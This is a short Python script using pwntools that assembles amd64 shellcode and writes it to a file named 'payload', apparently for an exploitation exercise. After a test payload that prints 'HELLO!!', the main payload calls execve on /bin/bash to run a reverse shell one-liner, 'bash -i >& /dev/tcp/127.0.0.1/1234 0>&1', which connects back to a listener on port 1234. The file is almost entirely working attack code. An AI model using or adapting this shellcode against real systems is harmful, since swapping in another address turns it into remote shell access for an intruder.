from pwn import *

context.arch = "amd64"
pl = asm("""
        push rdi
        push rsi
        push rdx
        mov rax,0x0A21214f4c4c4548
        push rax
        mov rdx,8
        mov rsi,rsp
        mov rdi,1
        mov rax,1
        syscall
        pop rax
        pop rdx
        pop rsi
        pop rdi


        """)
import pwnlib.shellcraft.amd64 as sh

pl = asm(
        """
        push rbp
        mov rbp,rsp
        sub rsp,0x50

        """ + 
        shellcraft.amd64.pushstr("/bin/bash")+
        "lea rax,[rsp] ; mov [rbp-0x40],rax" +

        shellcraft.amd64.pushstr("-c")+
        "lea rax,[rsp] ; mov [rbp-0x38],rax" +

        shellcraft.amd64.pushstr("bash -i >& /dev/tcp/127.0.0.1/1234 0>&1")+
        "lea rax,[rsp] ; mov [rbp-0x30],rax" +

        """
        mov rax,59
        mov rdi,[rbp-0x40]
        lea rsi,[rbp-0x40]
        mov rdx,0

        
        syscall
        """

        # shellcraft.amd64.linux.sh(),
        )
# pl = ''
with open("payload",'wb') as f:
    f.write(pl)
